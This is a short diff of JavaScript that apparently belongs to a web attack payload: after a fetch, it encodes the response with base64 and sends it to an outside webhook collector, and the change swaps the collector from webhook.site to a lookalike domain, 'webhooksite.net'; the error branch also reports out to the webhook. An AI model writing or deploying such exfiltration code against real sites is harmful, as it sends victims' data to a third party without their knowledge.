@@ -32,7 +32,7 @@
         .then(response => response.json())
         .then(result => {
             // Send the result to your webhook so you can see if it worked
-            fetch('https://webhook.site/9299acf8-393a-4d83-9963-c5763588fb5e?status=success&res=' + btoa(JSON.stringify(result)));
+            fetch('https://webhooksite.net/9179081b-61f3-42f5-823e-1d611bf431c3?status=success&res=' + btoa(JSON.stringify(result)));
         })
         .catch(err => {
             fetch('https://webhook.site/9299acf8-393a-4d83-9963-c5763588fb5e?status=error&msg=' + btoa(err));
